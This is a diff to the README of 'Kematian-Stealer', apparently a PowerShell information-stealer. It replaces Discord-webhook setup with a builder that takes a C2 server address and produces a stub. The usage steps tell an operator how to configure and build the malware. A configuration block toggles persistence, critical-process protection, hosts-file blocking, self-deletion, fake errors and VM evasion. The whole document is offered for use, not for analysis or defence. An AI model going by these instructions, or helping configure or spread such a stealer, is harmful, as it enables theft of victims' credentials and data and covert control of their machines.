@@ -46,25 +46,29 @@ Moreover, the tool has robust `persistence mechanisms` to remain active on the m
 <br>
 
 # Usage
-- Create a Webhook on your [Discord Server](https://discord.com), it's advisable to create a new server for this purpose.
-- After creating a server go to `Edit channel` > `Integrations` > `Webhooks` > `Create Webhook`
-- Copy the `Webhook URL`
-- Download [main.ps1](https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/main.ps1) 
-- Open `main.ps1` and replace `YOUR_WEBHOOK_HERE` in line `1` with your webhook or use the [builder](https://github.com/ChildrenOfYahweh/Kematian-Stealer/releases/tag/Builder).
-- Additionally, set `$true` for the variables you wish to activate. Conversely, utilize `$false` to deactivate them, as shown in `configurations` below.
+- Download [Builder](https://github.com/Somali-Devs/Kematian-Stealer-V3/releases/download/AutoBuild/main.exe) from the releases.
+- Open the builder you will get a message like this : `Private key and certificate have been generated and saved.`
+- The builder will start a local server after running which will run on `https://127.0.0.1:8080` by default.
+- Open your web browser and go to `https://127.0.0.1:8080/builder`
+- Input your C2 server in the `TCP TUNNEL URL:PORT` section
+- Next, activate the checkboxes for the features you want to include in the stub.
+- Finally hit build and the output stub will be placed in the same folder with the builder
  
  > [!NOTE]   
  > **THE DEBUG OPTION IS FOR TESTING PURPOSES ONLY**
 
 ### Configurations
 ```ps1
-$webhook = "YOUR_WEBHOOK_HERE" 
+$c2_server = "YOUR_URL_HERE_SERVER" 
 $debug = $false
-$blockhostsfile = $true
-$criticalprocess = $true
+$blockhostsfile = $false
+$criticalprocess = $false
 $melt = $false
 $fakeerror = $false
-$persistence = $true
+$persistence = $false
+$write_disk_only = $false
+$vm_protect = $false
+$encryption_key = "YOUR_ENC_KEY_HERE"
 ```
 
 # Requirements
